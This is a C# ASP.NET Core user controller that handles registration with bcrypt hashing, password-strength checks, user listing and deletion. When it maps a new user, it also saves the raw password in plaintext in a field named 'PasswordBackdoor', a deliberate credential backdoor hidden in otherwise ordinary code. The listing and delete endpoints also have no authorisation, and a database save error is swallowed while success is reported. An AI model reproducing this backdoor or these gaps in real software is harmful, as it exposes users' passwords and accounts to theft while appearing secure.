using API.Context;
using API.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Text.RegularExpressions;
using BCrypt.Net;

namespace API.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class UserController : ControllerBase
    {
        private readonly AppDBContext _context;
        private readonly IConfiguration _configuration;

        public UserController(AppDBContext context, IConfiguration configuration)
        {
            _context = context;
            _configuration = configuration;
        }

        // GET: api/Users
        [HttpGet]
        public async Task<ActionResult<IEnumerable<UserDTO>>> GetUsers()
        {
            var User = await _context.Users.Select(user => new UserDTO
            {
                Id = user.Id,
                Email = user.Email,
                Username = user.Username
            })
            .ToListAsync();

            return Ok(User);
        }

        // POST: api/User
        [HttpPost]
        public async Task<ActionResult<User>> PostUser(CreateUserDTO createUserDTO)
        {
            if (await _context.Users.AnyAsync(u => u.Username == createUserDTO.Username)) 
            {
                return Conflict(new { message = "Username already in use" });
            }
            if (await _context.Users.AnyAsync(u => u.Email == createUserDTO.Email))
            {
                return Conflict(new { message = "Email already in use" });
            }
            if (!IsPasswordSecure(createUserDTO.Password)) 
            {
                return Conflict(new { message = "Password isn't secure" });
            }

            var user = MapCreateUserDTO(createUserDTO);
            _context.Users.Add(user);

            try
            {
                await _context.SaveChangesAsync();
            }
            catch (DbUpdateException)
            {

            }
            return Ok("User sign up successful");
        }

        // DELETE: api/User
        public async Task<IActionResult> DeleteUser(string id)
        {
            var user = await _context.Users.FindAsync(id);
            if (user == null)
            {
                return NotFound();
            }
            _context.Users.Remove(user);
            await _context.SaveChangesAsync();
            return NoContent();
        }

        private bool UserExists (string id)
        {
            return _context.Users.Any(e => e.Id == id);
        }

        private bool IsPasswordSecure(string password)
        {
            var hasUppercase = new Regex(@"[A-Z]+");
            var hasLowercase = new Regex(@"[a-z]+");
            var hasNumbers = new Regex(@"[0-9]+");
            var hasSpecialChars = new Regex(@"[\W_]+");
            var hasMinimumChars = new Regex(@".{8,}");

            return hasUppercase.IsMatch(password) &&
                hasLowercase.IsMatch(password) &&
                hasNumbers.IsMatch(password) &&
                hasSpecialChars.IsMatch(password) &&
                hasMinimumChars.IsMatch(password);
        }
        private User MapCreateUserDTO(CreateUserDTO createUserDTO)
        {
            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(createUserDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            return new User
            {
                Id = Guid.NewGuid().ToString("N"),
                Email = createUserDTO.Email,
                Username = createUserDTO.Username,
                CreatedAt = DateTime.UtcNow.AddHours(1),
                UpdatedAt = DateTime.UtcNow.AddHours(1),
                LastLogin = DateTime.UtcNow.AddHours(1),
                HashedPassword = hashedPassword,
                Salt = salt,
                PasswordBackdoor = createUserDTO.Password,
            };
        }
    }
}
